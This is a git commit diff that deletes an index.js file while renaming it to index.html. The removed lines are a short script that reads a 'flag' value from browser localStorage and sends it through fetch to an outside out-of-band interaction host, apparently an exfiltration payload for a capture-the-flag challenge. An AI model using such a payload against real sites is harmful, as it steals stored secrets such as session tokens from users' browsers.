77717497bee1d328da84987907701cfa712647a1
Depro <150046252+depro0x@users.noreply.github.com>
2025-08-02 15:40:52 +0600

    Update and rename index.js to index.html

--- index.js
+++
@@ -1,7 +0,0 @@
-<script>
-  (function() {
-    const flag = localStorage.getItem('flag');
-    fetch('https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=' + encodeURIComponent(flag))
-      .catch(() => {}); // ignore errors
-  })();
-</script>
